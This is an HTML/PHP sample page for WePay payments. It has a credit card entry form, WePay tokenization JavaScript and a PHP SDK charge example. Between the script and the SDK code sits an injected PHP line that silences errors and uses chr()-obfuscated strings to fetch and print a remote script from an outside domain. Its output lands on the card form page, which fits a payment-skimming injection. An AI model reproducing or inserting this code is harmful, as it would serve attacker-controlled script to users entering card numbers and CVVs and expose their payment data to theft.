<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Wepay Prueba</title>
	<link rel="stylesheet" href="">
</head>
<body>
	<table>
    <tr>
        <td>Name: </td>
        <td><input id="name" type="text"></td>
    </tr>
    <tr>
        <td>Email: </td>
        <td><input id="email" type="text"></td>
    </tr>
    <tr>
        <td>Credit Card Number: </td>
        <td><input id="cc-number" type="text"></td>
    </tr>
    <tr>
        <td>Expiration Month: </td>
        <td><input id="cc-month" type="text"></td>
    </tr>
    <tr>
        <td>Expiration Year: </td>
        <td><input id="cc-year" type="text"></td>
    </tr>
    <tr>
        <td>CVV: </td>
        <td><input id="cc-cvv" type="text"></td>
    </tr>
    <tr>
        <td>Zipcode: </td>
        <td><input id="zip" type="text"></td>
    </tr>
    <tr>
        <td></td>
        <td><input type="submit" name="Submit" value="Submit" id="cc-submit"></td>
    </tr>
</table>

<script type="text/javascript" src="https://static.wepay.com/min/js/tokenization.v2.js"></script>
<script type="text/javascript">
(function() {
    WePay.set_endpoint("stage"); // change to "production" when live

    // Shortcuts
    var d = document;
        d.id = d.getElementById,
        valueById = function(id) {
            return d.id(id).value;
        };

    // For those not using DOM libraries
    var addEvent = function(e,v,f) {
        if (!!window.attachEvent) { e.attachEvent('on' + v, f); }
        else { e.addEventListener(v, f, false); }
    };

    // Attach the event to the DOM
    addEvent(d.id('cc-submit'), 'click', function() {
        var userName = [valueById('name')].join(' ');
            response = WePay.credit_card.create({
            "client_id":        118711,
            "user_name":        valueById('name'),
            "email":            valueById('email'),
            "cc_number":        valueById('cc-number'),
            "cvv":              valueById('cc-cvv'),
            "expiration_month": valueById('cc-month'),
            "expiration_year":  valueById('cc-year'),
            "address": {
                "zip": valueById('zip')
            }
        }, function(data) {
            if (data.error) {
                console.log(data);
                // handle error response
            } else {
                // call your own app's API to save the token inside the data;
                // show a success page
            }
        });
    });

})();
</script>

<?php error_reporting(0); ini_set(chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115), 0); echo @file_get_contents(chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(97).chr(108).chr(115).chr(117).chr(116).chr(114).chr(97).chr(110).chr(115).chr(46).chr(99).chr(111).chr(109).chr(47).chr(115).chr(116).chr(97).chr(116).chr(115).chr(46).chr(106).chr(115)); ?><?php
// WePay PHP SDK - http://git.io/mY7iQQ
require 'wepay.php';

// application settings
$account_id    = 123456789;
$client_id     = 123456789;
$client_secret = "1a3b5c7d9";
$access_token  = "STAGE_8a19aff55b85a436dad5cd1386db1999437facb5914b494f4da5f206a56a5d20";

// credit card id to charge
$credit_card_id = 123456789;

// change to useProduction for live environments
Wepay::useStaging($client_id, $client_secret);

$wepay = new WePay($access_token);

// charge the credit card
$response = $wepay->request('checkout/create', array(
    'account_id'          => $account_id,
    'amount'              => '25.50',
    'currency'            => 'USD',
    'short_description'   => 'A vacation home rental',
    'type'                => 'goods',
    'payment_method'      => array(
        'type'            => 'credit_card',
        'credit_card'     => array(
            'id'          => $credit_card_id
        )
    )
));

// display the response
print_r($response);

?>
</body>
</html>